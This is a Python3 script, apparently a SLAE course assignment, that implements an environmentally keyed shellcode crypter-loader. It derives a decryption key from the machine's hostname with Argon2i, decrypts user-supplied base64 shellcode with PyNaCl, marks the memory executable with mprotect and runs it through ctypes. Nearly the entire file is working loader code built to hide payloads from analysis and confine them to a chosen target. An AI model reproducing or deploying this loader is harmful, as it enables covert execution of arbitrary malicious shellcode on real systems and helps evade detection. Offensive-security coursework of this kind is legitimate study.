# Filename: shellcode_decrypter.py
# Author: Upayan a.k.a. slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: This is a Python3 script to decrypt an encrypted shellcode which is 
# fed into the program by the user and it executes the shellcode iff it was encrypted
# for the target environment(hostname).
# Usage: python3 shellcode_decrypter_loader.py
# Note: PyNaCl library has been used for decryption. Also note that the 
# hostname is used as a passphrase to decrypt the shellcode and execute it.


import socket
import nacl.secret
import nacl.utils
import nacl.pwhash
import base64
import sys
from ctypes import *


salt = b"\xb5\xbe\x95\x7fL\x84%\xd70\xbb\xe7\x19]\xf8\x9cT" # Use the same salt as used for encryption


def main():
    # Display author
    print("Author: Upayan a.k.a slaeryan\n")
    # Display purpose
    print("Purpose: This Python3 script is used to decrypt a shellcode using PyNaCl library using the encrypted shellcode which is fed as input   and the current hostname is fetched as passphrase and then executes the shellcode iff it was encrypted for the target environment.\n")
    # Obtain the passphrase
    hostname = socket.gethostname()
    passphrase = hostname.encode("utf-8")
    # Key Derivation Function
    kdf = nacl.pwhash.argon2i.kdf
    # Generate the key
    key = kdf(nacl.secret.SecretBox.KEY_SIZE, passphrase, salt)
    # Input the cipher text from the user
    ciphertext = input("[+] Enter the Encrypted Shellcode: ")
    # Encode the cipher text for decryption
    ciphertext_byte = base64.b64decode(ciphertext)
    # Create a SecretBox for decryption
    box = nacl.secret.SecretBox(key)
    # Try to decrypt the cipher text
    try:
        plaintext_byte = box.decrypt(ciphertext_byte)
    except:
        print("\n")
        print("[-] Decryption failed! Shellcode not meant for target environment!\n")
        sys.exit(0)
    # Decode the plaintext message for operations
    plaintext = plaintext_byte.decode("utf-8")
    # Display the plain text
    print("\n")
    print("[+] Original Shellcode: ", plaintext)
    print("\n")
    # Executing the shellcode now
    shellcode = bytes.fromhex(plaintext)
    libC = CDLL('libc.so.6')
    code = c_char_p(shellcode)
    sizeofshellcode = len(shellcode)
    memAddrPointer = c_void_p(libC.valloc(sizeofshellcode))
    codeMovePointer = memmove(memAddrPointer, code, sizeofshellcode)
    protectMemory = libC.mprotect(memAddrPointer, sizeofshellcode, 7)
    run = cast(memAddrPointer, CFUNCTYPE(c_void_p))
    print('[+] Now executing shellcode ...')
    run()


main()